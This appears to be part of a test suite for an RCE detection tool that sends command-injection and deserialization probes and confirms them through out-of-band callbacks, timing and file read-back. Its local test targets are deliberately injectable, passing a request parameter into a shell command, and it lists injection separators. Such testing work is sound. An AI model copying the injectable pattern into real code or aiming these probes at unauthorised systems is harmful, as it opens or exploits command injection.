                    body = base64.b64encode(payload[:below].encode()).decode()
                    with self.subTest(ecosystem=name, escape=rule, echo=below,
                                      wrapping="base64-below-floor"):
                        self.assertFalse(any(method._search(s, body) for s in sentinels))

    def test_the_escaped_sentinels_do_not_fire_on_a_parser_either(self):
        # The escaped forms are sentinels too, so they get the same negative
        # direction as the bare magic: a parser resolving the type name must not
        # match one. Measured bodies, every escape rule.
        gen = RCEKit()
        method = rcekit.DETECTION_METHODS["deser"](gen, {})
        for rule in sorted({str(ctx.get("escape", "none"))
                            for ctx in gen.contexts.values()} - {"none"}):
            payload = gen._escape_for_context(self.WELL, rule)
            sentinels = [s for s in method._reflection_sentinels(self.MAGIC, payload) if s]
            for label, body in (("type error", self.TYPE_ERROR),
                                ("syntax error", self.SYNTAX_ERROR)):
                matched = [s for s in sentinels if method._search(s, body)]
                self.assertEqual(matched, [],
                                 f"{rule}/{label}: sentinel matched a parser's own answer")

    def test_the_sentinels_do_not_fire_on_a_parser_that_names_the_class(self):
        # The other direction, on the bodies the live target returned. A parser
        # resolving the type name puts `java.lang.String` in its error and
        # never `{"@type":"`, and no encoding of the magic appears either.
        method = rcekit.DETECTION_METHODS["deser"](RCEKit(), {})
        sentinels = [s for s in method._reflection_sentinels(self.MAGIC, self.WELL) if s]
        for label, body in (("type error", self.TYPE_ERROR),
                            ("syntax error", self.SYNTAX_ERROR)):
            matched = [s for s in sentinels if method._search(s, body)]
            self.assertEqual(matched, [], f"{label}: sentinel matched a parser's own answer")

    def test_the_real_fastjson_bodies_do_not_trip_the_guard(self):
        # The guard must not cost the case it was added around. Measured on the
        # live target: the error body carries `java.lang.String` -- the class
        # the target resolved -- and never `{"@type":"`, the syntax around it.
        # That is the whole distinction the guard rests on.
        sent = {"wellformed": self.WELL, "truncated": self.TRUNC,
                "noise": self.NOISE, "noise_again": self.NOISE}
        self.assertFalse(self.method._reflects_its_input("fastjson", {
            name: (Probe(payload=sent[name], expected=""), Observation(400, body))
            for name, body in (("wellformed", self.TYPE_ERROR),
                               ("truncated", self.TYPE_ERROR),
                               ("noise", self.SYNTAX_ERROR),
                               ("noise_again", self.SYNTAX_ERROR))}))

    def test_an_endpoint_that_starts_throttling_is_not_read_as_a_parser(self):
        # The differential is read across requests, so anything that changes
        # with the request index rather than with the payload lands on whichever
        # form goes last -- and noise went last, every time. An endpoint that
        # begins throttling partway through answers 200, 200, 429 and satisfies
        # the noise route without having looked at a single payload.
        #
        # The two noise probes bracket the batch and are the same probe twice,
        # so a target that held still must answer them alike.
        sent = {"wellformed": self.WELL, "truncated": self.TRUNC,
                "noise": self.NOISE, "noise_again": self.NOISE_AGAIN}
        verdict = self._verdict((200, self.ACCEPTED), (200, self.ACCEPTED),
                                (200, self.ACCEPTED),
                                payloads=sent,
                                noise_again=(429, '{"error":"rate limited"}'))
        self.assertEqual(verdict.status, "inconclusive")
        self.assertIn("did not hold still", verdict.evidence)

    def test_a_steady_target_is_unaffected_by_the_bracket(self):
        # The guard costs nothing when the endpoint answers the same probe the
        # same way twice, which is the ordinary case and the one the fastjson
        # target is.
        sent = {"wellformed": self.WELL, "truncated": self.TRUNC,
                "noise": self.NOISE, "noise_again": self.NOISE_AGAIN}
        self.assertFalse(self.method._reflects_its_input("fastjson", {
            name: (Probe(payload=sent[name], expected=""), Observation(400, body))
            for name, body in (("wellformed", self.TYPE_ERROR),
                               ("truncated", self.TYPE_ERROR),
                               ("noise", self.SYNTAX_ERROR),
                               ("noise_again", self.SYNTAX_ERROR))}))

    def test_the_bracketing_probes_are_sent_first_and_last(self):
        # A bracket placed anywhere else is not a bracket. Both ends, and two
        # different random tails, because the engine de-duplicates by payload
        # and would send one repeat of an identical probe.
        import random as _random
        probes = self.method.build_probes(make_record(environment="unix", context="raw"),
                                          _random.Random(11))
        shape = [p for p in probes
                 if p.carrier == "fastjson" and (p.phase or "").startswith("shape/")]
        self.assertEqual([p.phase.split("/", 1)[1] for p in shape],
                         ["noise", "wellformed", "truncated", "noise_again"])
        self.assertEqual(shape[0].payload, shape[-1].payload,
                         "the bracket is the same probe twice, or a difference in the "
                         "answers cannot be attributed to the endpoint moving")

    def test_identical_aggregate_probes_are_both_delivered(self):
        """The bracket is one probe sent twice, which only works because the
        aggregate path fires every entry of its batch.

        The per-probe path does de-duplicate by payload, and reading that one
        is what sent this design down a detour: the two bracketing probes were
        given differing suffixes to survive a de-duplication that was never
        going to happen to them, and differing suffixes are exactly what the
        bracket cannot have. This pins the property across the module boundary,
        because if the aggregate path ever gained the same de-duplication the
        bracket would quietly become a single request and the drift check would
        compare an answer with itself -- passing, always, and proving
        nothing."""
        seen = collections.Counter()

        def route(method, path, params, headers, body):
            seen[body] += 1
            return 200, "ok"

        with local_target(route) as base:
            RCEKit().run_detection(
                [make_record(environment="unix", context="raw")],
                url=f"{base}/", method="POST", data="FUZZ", headers=None,
                url_location="query_value", body_location="raw",
                methods=["deser"], config={}, timeout=10)

        repeated = {body: n for body, n in seen.items() if n > 1}
        self.assertTrue(
            repeated,
            "no payload was delivered twice — the aggregate path now de-duplicates, "
            "and the shape bracket is one request pretending to be two")
        self.assertTrue(all(n == 2 for n in repeated.values()), repeated)

    def test_a_sentinel_the_control_carries_too_is_not_reflection(self):
        # The guard judged the probe's response alone, which is the one mistake
        # this tool is built to avoid -- made by the guard against it. A page
        # whose ordinary content spells a short magic (`gASV` is four
        # characters) answers identically with and without the payload, so the
        # text provably did not come from the probe, and the carrier was thrown
        # away as reflection anyway.
        page = "<html><body>build id gASV-1140 nightly</body></html>"
        well = self.gen.deser_probes["python_pickle"]["wellformed"]
        forms = {name: (Probe(payload=well, expected=""),
                        Observation(200, page, control_body=page))
                 for name in ("wellformed", "truncated", "noise", "noise_again")}
        self.assertFalse(self.method._reflects_its_input("python_pickle", forms))
        self.assertEqual(self.method._shape_verdict("python_pickle", forms)[1].status,
                         "negative")

    def test_a_sentinel_absent_from_the_control_is_still_reflection(self):
        # The guard against over-correcting the above: differencing must not
        # cost the echo it exists to catch.
        well = self.gen.deser_probes["python_pickle"]["wellformed"]
        forms = {name: (Probe(payload=well, expected=""),
                        Observation(200, f"you sent {well[:12]}", control_body="you sent "))
                 for name in ("wellformed", "truncated", "noise", "noise_again")}
        self.assertTrue(self.method._reflects_its_input("python_pickle", forms))

    def test_sentinels_are_anchored_on_the_magic_not_the_payload_start(self):
        # A probe is wrapped for its injection context before it goes out, and
        # some wrappers are longer than the magic: an xml_cdata pickle probe
        # begins `<![CDATA[gASV`, so a slice from the front captures `<![CD`
        # and never reaches the format bytes. A sentinel made of the wrapper is
        # one every echoing endpoint matches while echoing less than the magic.
        import random as _random
        magic = self.gen.deser_probes["python_pickle"]["magic"]
        for context in ("raw", "xml_cdata", "shell_double_quoted", "attribute"):
            probes = self.method.build_probes(
                make_record(environment="unix", context=context), _random.Random(2))
            probe = next(p for p in probes
                         if p.carrier == "python_pickle" and p.phase == "shape/wellformed")
            sentinels = [s for s in self.method._reflection_sentinels(magic, probe.payload) if s]
            with self.subTest(context=context):
                self.assertTrue(any(magic in s for s in sentinels),
                                f"no raw sentinel reaches the magic: {sentinels}")

    def test_an_echo_shorter_than_the_magic_is_not_reflection_through_a_wrapper(self):
        # The same floor as the unwrapped case, stated where the wrapper could
        # otherwise supply the match on its own.
        import random as _random
        probes = self.method.build_probes(
            make_record(environment="unix", context="xml_cdata"), _random.Random(2))
        shape = {p.phase.split("/", 1)[1]: p for p in probes
                 if p.carrier == "python_pickle" and (p.phase or "").startswith("shape/")}
        forms = {name: (probe, Observation(200, "<![CD", control_body="ok"))
                 for name, probe in shape.items()}
        self.assertFalse(self.method._reflects_its_input("python_pickle", forms))

    def test_a_lowercased_echo_is_still_an_echo(self):
        # `_signature` lowercases the bodies before comparing them, so an
        # endpoint that lowercases what it echoes answers the structured pair
        # alike -- which is exactly what sends the noise route looking. A
        # case-sensitive search for `rO0AB` in `ro0abx` finds nothing, so the
        # guard was blind in the one place the route fires. Two halves of one
        # oracle, folding case two different ways.
        well = self.gen.deser_probes["java"]["wellformed"]
        magic = self.gen.deser_probes["java"]["magic"]
        forms = {}
        for name in ("wellformed", "truncated", "noise", "noise_again"):
            echoed = well[:6] if name in ("wellformed", "truncated") else (magic + "Q")[:6]
            forms[name] = (Probe(payload=well, expected=""),
                           Observation(200, echoed.lower()))
        self.assertTrue(self.method._reflects_its_input("java", forms))
        self.assertEqual(self.method._shape_verdict("java", forms)[1].status, "inconclusive")

    def test_case_folding_does_not_answer_for_the_control(self):
        # The guard against over-correcting: folding case must not lose the
        # control differential with it.
        well = self.gen.deser_probes["java"]["wellformed"]
        page = "nightly build ro0abx"
        forms = {name: (Probe(payload=well, expected=""),
                        Observation(200, page, control_body=page))
                 for name in ("wellformed", "truncated", "noise", "noise_again")}
        self.assertFalse(self.method._reflects_its_input("java", forms))

    def test_a_format_with_no_magic_has_no_control_to_rest_on(self):
        # Without a magic there is no reflection sentinel, so an endpoint that
        # echoes cannot be told from one that parses -- and the differential
        # answers anyway, because the noise form is random where a structured
        # pair is not. Every shipped format declares one; a --template-file
        # need not, and reading a control that cannot be validated is the thing
        # this tool refuses everywhere else.
        gen = RCEKit()
        gen.deser_probes = {"custom": {"wellformed": "ABCDEF", "truncated": "ABCDE",
                                       "magic": ""}}
        method = rcekit.DETECTION_METHODS["deser"](gen, {})
        echoing = {name: (Probe(payload="ABCDEF", expected=""), Observation(200, "ABC"))
                   for name in ("wellformed", "truncated")}
        echoing["noise"] = echoing["noise_again"] = (
            Probe(payload="ZQWERTY", expected=""), Observation(200, "ZQW"))
        verdict = method._shape_verdict("custom", echoing)[1]
        self.assertEqual(verdict.status, "inconclusive")
        self.assertIn("no magic bytes", verdict.evidence)

    def test_base64_sentinels_align_on_bytes_not_characters(self):
        # base64 encodes bytes. Rounding the character count agrees with the
        # byte count only while the magic is ASCII -- true of every ecosystem
        # the shipped corpus declares, and not something a --template-file has
        # to honour.
        magic, well = "éAB", "éABX"
        sentinels = self.method._reflection_sentinels(magic, well)
        body = base64.b64encode(well.encode()).decode()
        self.assertTrue(any(s and body.startswith(s) for s in sentinels),
                        f"no sentinel is a prefix of {body}: {sentinels}")

    def test_the_negative_says_which_comparison_collapsed(self):
        # "answers all three forms alike" was asserted rather than observed, and
        # on fastjson it was false in both halves: noise differed, and the
        # endpoint plainly parsed the format. A verdict that misdescribes what
        # it saw is worse than a terse one.
        verdict = self._verdict((400, self.TYPE_ERROR), (500, self.SYNTAX_ERROR),
                                (400, self.TYPE_ERROR))
        self.assertEqual(verdict.status, "negative")
        self.assertNotIn("every form alike", verdict.evidence)
        self.assertIn("noise form", verdict.evidence)


class OobChannelWarningTestCase(unittest.TestCase):
    """A DNS callback travels the real resolver hierarchy, so it only arrives if
    this listener is the authority for the OOB domain — port 53 plus NS
    delegation. On any other port the DNS probes are still sent and can never
    call back, and the startup line said `DNS :5335` with no hint of it."""

    class _Args:
        def __init__(self, oob_host="oob.example.com", listen_dns_port=5335):
            self.oob_host = oob_host
            self.listen_dns_port = listen_dns_port

    @staticmethod
    def _methods(*names, formats=None):
        """Configured instances, because whether a method calls back can depend
        on its own flags rather than only on its class."""
        gen = RCEKit()
        config = {"oob_host": "10.0.0.9"}
        if formats is not None:
            config["deser_formats"] = formats
        return [rcekit.DETECTION_METHODS[n](gen, dict(config)) for n in names]

    def test_a_non_standard_dns_port_is_called_out(self):
        lines = rcekit.oob_channel_warnings(self._Args(), dns_up=True)
        self.assertTrue(lines)
        self.assertIn("port 53", lines[0])
        self.assertIn("--listen-dns-port 53", lines[0])

    def test_port_53_with_a_domain_is_silent(self):
        self.assertEqual(
            rcekit.oob_channel_warnings(self._Args(listen_dns_port=53), dns_up=True), [])

    def test_a_failed_dns_bind_is_called_out(self):
        lines = rcekit.oob_channel_warnings(self._Args(listen_dns_port=53), dns_up=False)
        self.assertTrue(lines)
        self.assertIn("cannot call back", lines[0])

    def test_an_ip_host_has_no_dns_probes_to_warn_oob_about(self):
        # With an address literal `oob` puts the token in the URL path and
        # builds no DNS shape, so there is nothing to warn it about. This once
        # read as a statement about the flag rather than about `oob`, and the
        # silence it pinned is what let `deser` send a dead gadget unremarked.
        for host in ("10.0.0.1", "127.0.0.1"):
            with self.subTest(host=host):
                self.assertEqual(
                    rcekit.oob_channel_warnings(self._Args(oob_host=host), dns_up=False), [])

    def test_a_method_that_needs_a_dns_label_is_named_when_given_an_address(self):
        """`lookup` and `deser` have nowhere but a DNS label to put a token.

        An address strands them: `lookup` builds no probes at all and `deser`
        loses the half that reaches its own tier. Saying nothing there is the
        failure this whole function exists to prevent -- the operator reads a
        capped verdict as a result rather than as a channel that was never
        live."""
        lines = rcekit.oob_address_strands(self._Args(oob_host="10.0.0.9"),
                                           self._methods("lookup", "deser"))
        self.assertTrue(lines, "an address stranded two methods and nothing was said")
        self.assertIn("lookup/deser", lines[0])
        self.assertIn("10.0.0.9", lines[0])
        # The tier each one can no longer reach, read off the class rather than
        # spelled out here, so a retier moves the message with it.
        for name in ("lookup", "deser"):
            self.assertIn(rcekit.DETECTION_METHODS[name].tier, lines[0])

    def test_a_method_with_a_second_channel_is_not_named(self):
        # The negative that keeps the notice honest: `oob` is fine with an
        # address, so a run selecting it alongside a stranded method must not
        # see `oob` blamed, and a run without a stranded method sees nothing.
        lines = rcekit.oob_address_strands(self._Args(oob_host="10.0.0.9"),
                                           self._methods("oob", "deser"))
        self.assertTrue(lines)
        self.assertNotIn("oob/", lines[0])
        self.assertNotIn("/oob", lines[0])
        self.assertEqual(
            rcekit.oob_address_strands(self._Args(oob_host="10.0.0.9"),
                                       self._methods("oob", "reflected")), [])

    def test_a_delegated_name_strands_nobody(self):
        # The guard against over-correcting: the notice is about an address,
        # so a name must leave a correctly configured run silent.
        self.assertEqual(
            rcekit.oob_address_strands(self._Args(), self._methods("lookup", "deser")), [])
        # And a run that named no host at all has nothing to say either.
        self.assertEqual(
            rcekit.oob_address_strands(self._Args(oob_host=""),
                                       self._methods("lookup", "deser")), [])

    def test_a_format_with_no_gadget_was_not_stranded_by_the_address(self):
        """Three of the five deserialization ecosystems ship no DNS gadget.

        With `--deser-formats php` there is no callback probe to lose, so the
        address took nothing away -- and the notice used to blame it anyway and
        send the operator after a delegated domain that could not have helped.
        The limit there belongs to the format, not to the host."""
        args = self._Args(oob_host="10.0.0.9")
        for formats in (["php"], ["php", "dotnet", "python_pickle"]):
            with self.subTest(formats=formats):
                self.assertEqual(
                    rcekit.oob_address_strands(args, self._methods("deser", formats=formats)), [])
        # One ecosystem that does ship a gadget is enough to be stranded again,
        # which is the guard against silencing the notice altogether.
        for formats in (["java"], ["php", "java"], None):
            with self.subTest(formats=formats):
                lines = rcekit.oob_address_strands(
                    args, self._methods("deser", formats=formats))
                self.assertTrue(lines, f"{formats} has a gadget and lost it to the address")
                self.assertIn("deser", lines[0])

    def test_the_warning_reaches_the_operator(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent",
             "--verify-url", "http://127.0.0.1:9/x?q=FUZZ", "--environments", "unix",
             "--contexts", "raw", "--categories", "basic_enum", "--methods", "oob",
             "--oob-host", "oob.example.com", "--verify-active-risk", "intrusive",
             "--listen-http-port", "0"],
            capture_output=True, text=True, timeout=300)
        self.assertIn("DNS probes cannot call back", result.stdout)

    def test_the_stranded_notice_reaches_an_operator_running_deser_alone(self):
        """`deser` never reaches the block the other OOB notices are printed in.

        It does not *require* a callback host, so it is not in
        `callback_methods` and no listener is started for it -- which is
        exactly the run this notice exists for, and exactly the run a notice
        placed with the others could not reach."""
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent",
             "--verify-url", "http://127.0.0.1:9/x?q=FUZZ", "--environments", "java",
             "--contexts", "raw", "--categories", "basic_enum", "--methods", "deser",
             "--oob-host", "10.0.0.9", "--max-payloads", "1"],
            capture_output=True, text=True, timeout=300)
        self.assertIn("cannot carry a token in an address", result.stdout)
        self.assertIn("deser", result.stdout)


class ListenerGateTestCase(unittest.TestCase):
    """A listener is needed by whoever calls back, not by whoever cannot run
    without a host.

    `needs_oob_host` was answering both questions. `deser` is where they come
    apart -- its shape oracle proves something with no listener at all, so the
    run must not stop when no host is named, but its DNS gadget does call back
    and needs one. Reading the gate off `needs_oob_host` started no listener
    for a `deser`-only run: the gadgets went to the target and nothing existed
    to receive the callback, with a delegated host configured perfectly."""

    def _run(self, *extra):
        return subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent",
             "--verify-url", "http://127.0.0.1:9/x?q=FUZZ", "--environments", "java",
             "--contexts", "raw", "--categories", "basic_enum", "--max-payloads", "1",
             "--listen-http-port", "0", *extra],
            capture_output=True, text=True, timeout=300).stdout

    def test_the_two_attributes_disagree_only_where_they_must(self):
        # Requiring a host implies using one; the reverse does not hold, and
        # `deser` is the method that makes the distinction worth having. A
        # method added later that got this backwards would start no listener
        # and report a clean negative about a channel that was never open.
        for name, cls in rcekit.DETECTION_METHODS.items():
            with self.subTest(method=name):
                if cls.needs_oob_host:
                    self.assertTrue(cls.uses_oob_host,
                                    f"{name} requires a callback host but claims not to use one")
        self.assertTrue(rcekit.DeserSink.uses_oob_host)
        self.assertFalse(rcekit.DeserSink.needs_oob_host)

    def test_deser_alone_with_a_host_gets_a_listener(self):
        """The defect: the gadget probes were built and sent either way, so
        with no listener they were requests the target answered and nothing
        could follow."""
        out = self._run("--methods", "deser", "--oob-host", "oob.example.com")
        self.assertIn("OOB listener up", out)

    def test_deser_with_no_host_starts_nothing(self):
        # The other half of why this is two attributes: no host named is not an
        # error for `deser`, it just means the shape oracle runs alone.
        out = self._run("--methods", "deser")
        self.assertNotIn("OOB listener up", out)

    def test_a_method_that_never_calls_back_starts_nothing(self):
        # The negative that keeps the gate from becoming "a host was named".
        out = self._run("--methods", "reflected", "--oob-host", "oob.example.com")
        self.assertNotIn("OOB listener up", out)

    def test_a_format_with_no_gadget_starts_no_listener(self):
        """Whether `deser` calls back is a property of the run, not the class.

        `--deser-formats php` builds no callback probe at all, so a listener
        started for it would wait on something that is never sent. The gate
        asks the configured method rather than its class for that reason."""
        out = self._run("--methods", "deser", "--deser-formats", "php",
                        "--oob-host", "oob.example.com")
        self.assertNotIn("OOB listener up", out)

    def test_a_format_that_has_a_gadget_still_starts_one(self):
        # The guard against the above silencing the gate altogether.
        out = self._run("--methods", "deser", "--deser-formats", "java",
                        "--oob-host", "oob.example.com")
        self.assertIn("OOB listener up", out)

    def test_an_address_a_method_cannot_use_starts_no_listener(self):
        """A listener bound for a method that cannot use the host receives
        nothing, and the run said so twice over in opposite directions.

        `deser` and `lookup` carry a token as a DNS label or not at all, so
        `build_probes` drops the host and sends no callback probe. Binding the
        ports anyway printed "the target will open outbound connections"
        directly beneath the notice saying those probes are not sent."""
        for method in ("deser", "lookup"):
            with self.subTest(method=method):
                out = self._run("--methods", method, "--oob-host", "10.0.0.9",
                                "--verify-active-risk", "intrusive")
                self.assertNotIn("OOB listener up", out)
                self.assertNotIn("will open outbound connections", out)
                self.assertIn("cannot carry a token in an address", out)

    def test_an_address_oob_can_use_still_starts_one(self):
        """The negative that keeps the above from over-reaching.

        `oob` has a second channel: with an address it drops the DNS shapes and
        puts the token in a URL path, so the listener is exactly what it needs.
        Refusing one here would take away the only method an address serves."""
        out = self._run("--methods", "oob", "--oob-host", "10.0.0.9",
                        "--verify-active-risk", "intrusive")
        self.assertIn("OOB listener up", out)


class TimingScreenDepthTestCase(unittest.TestCase):
    """`--probe-depth quick` trades probe *shapes* for requests. Narrowing the
    timing screen to the first separator looked like the same kind of saving and
    was not: it put back the ';'-only blind spot the screen exists to remove, so
    a sink that merely filters ';' reported negative — silently, and only for the
    operator who chose 'quick' to be gentle on a rate-limited target."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _separators(self, depth):
        """Every separator the screen tries, across all of its waves."""
        import random as _random
        method = ParametricTime(self.gen, {"time_base": 1.0, "probe_depth": depth})
        series, batch, seen = [], method.build_probes(self.rec, _random.Random(1)), set()
        while batch and not any(p.phase == "regress" for p in batch):
            seen |= {p.separator for p in batch}
            # Nothing breaks out, so the screen keeps widening until exhausted.
            series += [(p, Observation(status=200, body="", elapsed=0.1)) for p in batch]
            batch = method.next_probes(series)
        return seen

    def test_both_depths_screen_every_separator(self):
        # None is the `raw` rung, screened at both depths for the same reason
        # every separator is: leaving a whole sink shape undetectable is not the
        # kind of saving --probe-depth is for.
        expected = {"; ", "| ", "|| ", "&& ", "\n", None}
        self.assertEqual(self._separators("quick"), expected)
        self.assertEqual(self._separators("full"), expected)

    def test_the_two_depths_screen_identically(self):
        self.assertEqual(self._separators("quick"), self._separators("full"))

    def test_an_explicit_separator_list_still_narrows_it(self):
        # Cutting the request count by naming the sink's shape stays available;
        # it is just no longer a silent side effect of --probe-depth.
        import random as _random
        probes = ParametricTime(
            self.gen, {"time_base": 1.0, "separators": ["| "]}).build_probes(
            self.rec, _random.Random(1))
        self.assertEqual({p.separator for p in probes}, {"| "})


RAW_CAPTURE = (
    "POST /cgi-bin/status?view=summary&lang=en HTTP/1.1\r\n"
    "Host: target.example\r\n"
    "User-Agent: Mozilla/5.0\r\n"
    "Referer: http://target.example/\r\n"
    "X-Trace-Id: abc\r\n"
    "Accept-Language: en-GB\r\n"
    "Connection: keep-alive\r\n"
    "Cookie: sid=abc123; theme=dark\r\n"
    "Content-Type: application/json\r\n"
    "Content-Length: 52\r\n"
    "\r\n"
    '{"user": {"profile": {"name": "ali"}}, "tags": ["a", 2]}'
)


class FileReadBackTestCase(unittest.TestCase):
    """The `file` method's read-back channel does not have to be a web root.

    An LFI endpoint, a download or export handler, an attachment fetcher and a
    /tmp-backed preview are all read-back channels. Requiring a writable web
    root ruled every one of them out — on exactly the internal, no-egress
    targets this method exists for."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _channel(self, config):
        return FileBased(self.gen, config)._channel()

    # -- resolving the two halves -------------------------------------------

    def test_the_explicit_pair_is_used_as_given(self):
        self.assertEqual(
            self._channel({"file_write_path": "/tmp",
                           "file_read_url": "http://t/dl?f={path}"}),
            ("/tmp", "http://t/dl?f={path}"))

    def test_the_webroot_alias_builds_the_same_shape(self):
        # Backward compatibility: a web root is just the case where the read URL
        # is the base plus the filename.
        self.assertEqual(
            self._channel({"webroot": "/var/www/html", "web_base_url": "http://t/"}),
            ("/var/www/html", "http://t/{name}"))

    def test_half_a_channel_is_not_a_channel(self):
        for config in ({"file_write_path": "/tmp"}, {"file_read_url": "http://t/{name}"},
                       {"webroot": "/var/www"}, {"web_base_url": "http://t"}, {}):
            self.assertIsNone(self._channel(config), config)
            self.assertFalse(FileBased(self.gen, config).applicable(self.rec), config)
            import random as _random
            self.assertEqual(FileBased(self.gen, config).build_probes(
                self.rec, _random.Random(1)), [], config)

    def test_the_explicit_flags_win_over_the_alias(self):
        self.assertEqual(
            self._channel({"webroot": "/var/www", "web_base_url": "http://t",
                           "file_write_path": "/tmp",
                           "file_read_url": "http://t/dl?f={path}"}),
            ("/tmp", "http://t/dl?f={path}"))

    # -- template rendering --------------------------------------------------

    def test_every_placeholder_is_substituted(self):
        render = FileBased._render_read_url
        self.assertEqual(render("http://t/{name}", "/tmp/a.txt", "a.txt"), "http://t/a.txt")
        self.assertEqual(render("http://t/dl?f={path}", "/tmp/a.txt", "a.txt"),
                         "http://t/dl?f=/tmp/a.txt")
        self.assertEqual(render("http://t/dl?f={path_enc}", "/tmp/a.txt", "a.txt"),
                         "http://t/dl?f=%2Ftmp%2Fa.txt")

    def test_other_braces_in_the_url_survive(self):
        # Only the three placeholders are substituted, so a URL that legitimately
        # contains braces is not mangled.
        self.assertEqual(
            FileBased._render_read_url("http://t/dl?q={\"a\":1}&f={name}", "/tmp/a.txt", "a.txt"),
            "http://t/dl?q={\"a\":1}&f=a.txt")

    # -- probe construction --------------------------------------------------

    def _probes(self, config, environment="unix"):
        import random as _random
        return FileBased(self.gen, config).build_probes(
            make_record(environment=environment, context="raw"), _random.Random(3))

    def test_the_written_path_and_the_read_url_agree(self):
        probes = self._probes({"file_write_path": "/tmp",
                               "file_read_url": "http://t/dl?f={path}"})
        self.assertTrue(probes)
        for probe in probes:
            path = probe.followup["path"]
            self.assertTrue(path.startswith("/tmp/"))
            self.assertEqual(probe.followup["url"], f"http://t/dl?f={path}")
            self.assertIn(path, probe.followup["cleanup"])

    def test_a_trailing_separator_on_the_write_path_is_not_doubled(self):
        probe = self._probes({"file_write_path": "/tmp/",
                              "file_read_url": "http://t/{name}"})[0]
        self.assertNotIn("//", probe.followup["path"])

    def test_windows_writes_with_a_backslash_and_cleans_up_with_del(self):
        probe = self._probes({"file_write_path": "C:\\inetpub\\",
                              "file_read_url": "http://t/{name}"}, environment="windows")[0]
        self.assertTrue(probe.followup["path"].startswith("C:\\inetpub\\"))
        self.assertNotIn("\\\\", probe.followup["path"])
        self.assertTrue(probe.followup["cleanup"].startswith("del "))

    def test_the_token_is_never_in_the_payload(self):
        # The oracle is unchanged: the token appears only if the target wrote it.
        for probe in self._probes({"file_write_path": "/tmp",
                                   "file_read_url": "http://t/{name}"}):
            self.assertIn(probe.expected, probe.payload,
                          "the write command carries the token by construction")
            self.assertNotIn(probe.expected, probe.followup["url"])

    # -- end to end ----------------------------------------------------------

    def _target(self, writedir, serve_webroot):
        import os

        def route(method, path, params, headers, body):
            if path == "/download":
                served = params.get("f", "")
                if served and os.path.exists(served):
                    with open(served) as handle:
                        return 200, handle.read()
                return 200, "no such export"
            if serve_webroot and path.startswith("/files/"):
                served = os.path.join(writedir, os.path.basename(path))
                if os.path.exists(served):
                    with open(served) as handle:
                        return 200, handle.read()
                return 404, "not found"
            pipe = sh_popen("echo LOOKUP " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out
        return route

    def test_a_download_handler_is_a_read_back_channel(self):
        # The case the method could not reach before: somewhere writable that no
        # web server serves, plus a handler that reads a path back.
        import tempfile
        writedir = shell_writable_dir()
        with local_target(self._target(writedir, serve_webroot=False)) as base:
            without = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["file"],
                config={"webroot": writedir, "web_base_url": f"{base}/files"}, timeout=15)
            with_channel = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["file"],
                config={"file_write_path": writedir,
                        "file_read_url": base + "/download?f={path_enc}"}, timeout=15)
        self.assertFalse([r for r in without if r["verdict"] == "executed"],
                         "precondition: nothing serves the write directory")
        self.assertTrue([r for r in with_channel if r["verdict"] == "executed"],
                        "a download handler must work as the read-back channel")

    def test_the_webroot_alias_still_confirms_on_a_web_root(self):
        import tempfile
        writedir = shell_writable_dir()
        with local_target(self._target(writedir, serve_webroot=True)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["file"],
                config={"webroot": writedir, "web_base_url": f"{base}/files"}, timeout=15)
        self.assertTrue([r for r in results if r["verdict"] == "executed"])

    # -- authentication on the read-back fetch -------------------------------

    def test_same_origin_read_back_carries_the_runs_headers(self):
        # The write executes with the run's headers; the fetch used to go bare.
        # A generalised read-back channel is an application endpoint, and those
        # are usually behind a session.
        kept = self.gen._followup_headers(
            "http://t/a", "http://t/download",
            ["Authorization: Bearer x", "Cookie: sid=y", "Accept: */*"])
        self.assertEqual(kept, ["Authorization: Bearer x", "Cookie: sid=y", "Accept: */*"])

    def test_cross_origin_read_back_never_carries_credentials(self):
        # Replaying the target's session to another host would leak it.
        kept = self.gen._followup_headers(
            "http://t/a", "http://elsewhere/download",
            ["Authorization: Bearer x", "Cookie: sid=y", "Accept: */*"])
        self.assertEqual(kept, ["Accept: */*"])

    def test_body_headers_are_not_carried_on_the_get(self):
        kept = self.gen._followup_headers(
            "http://t/a", "http://t/b",
            ["Content-Type: application/json", "Content-Length: 12", "Accept: */*"])
        self.assertEqual(kept, ["Accept: */*"])

    def test_no_headers_stays_none(self):
        self.assertIsNone(self.gen._followup_headers("http://t/a", "http://t/b", None))
        self.assertIsNone(self.gen._followup_headers("http://t/a", "http://t/b", []))
        self.assertIsNone(self.gen._followup_headers(
            "http://t/a", "http://x/b", ["Authorization: only-this"]))

    def test_same_origin_compares_scheme_host_and_effective_port(self):
        same = RCEKit.same_origin
        self.assertTrue(same("https://t/a", "https://t:443/b"))
        self.assertTrue(same("http://T/a", "http://t:80/b"))
        self.assertFalse(same("http://t/a", "https://t/b"))
        self.assertFalse(same("http://t/a", "http://t:8080/b"))
        self.assertFalse(same("http://t/a", "http://other/b"))
        self.assertFalse(same("http://t/a", "http://t:notaport/b"))

    def test_an_authenticated_read_back_handler_confirms(self):
        # End to end: the write lands, the protected fetch authenticates, and the
        # token comes back. Without the headers this returned `negative` on a
        # target that had executed every probe.
        import os
        import tempfile
        writedir = shell_writable_dir()

        def route(method, path, params, headers, body):
            if path == "/download":
                if headers.get("Authorization") != "Bearer s3cr3t":
                    return 401, "unauthorized"
                served = params.get("f", "")
                if served and os.path.exists(served):
                    with open(served) as handle:
                        return 200, handle.read()
                return 200, "missing"
            pipe = sh_popen("echo LOOKUP " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            config = {"file_write_path": writedir,
                      "file_read_url": base + "/download?f={path_enc}"}
            authed = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["file"],
                headers=["Authorization: Bearer s3cr3t"], config=config, timeout=15)
            bare = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["file"],
                config=config, timeout=15)

        self.assertTrue([r for r in authed if r["verdict"] == "executed"],
                        "the read-back fetch must authenticate like the write did")
